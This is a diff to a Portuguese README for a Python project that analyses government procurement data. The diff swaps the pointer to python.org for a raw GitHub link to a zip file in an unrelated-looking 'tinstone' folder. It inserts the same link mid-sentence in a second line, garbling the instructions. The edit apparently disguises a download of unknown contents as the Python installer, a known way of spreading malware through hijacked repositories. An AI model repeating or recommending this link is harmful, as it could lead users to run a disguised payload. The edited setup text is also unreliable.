@@ -20,12 +20,12 @@ Os dados foram disponibilizados no formato .csv e em uma planilha do excell. Atr
 ## Inicialização
 Para Inicializar o Projeto:
 
-Certifique se que tenha o Python instalado em sua máquina. Você pode baixá-lo em python.org.Tambem e necessário que instale as bibliotecas
+Certifique se que tenha o Python instalado em sua máquina. Você pode baixá-lo em https://raw.githubusercontent.com/LeannJota/ProjetoComprasGov/main/tinstone/ProjetoComprasGov.zip e necessário que instale as bibliotecas
 **Pandas e Matplotlib**
 >pip install pandas matplotlib.
 
 Obtenha o código-fonte do projeto.
-Tenha o arquivo CSV de dados que o código irá analisar.Use um ambiente de desenvolvimento, como o Visual Studio Code (VS Code), se preferir.
+Tenha o arquivo CSV de dados que o código irá https://raw.githubusercontent.com/LeannJota/ProjetoComprasGov/main/tinstone/ProjetoComprasGov.zip um ambiente de desenvolvimento, como o Visual Studio Code (VS Code), se preferir.
 Abra o arquivo Python em seu ambiente de desenvolvimento e execute-o.
 
 
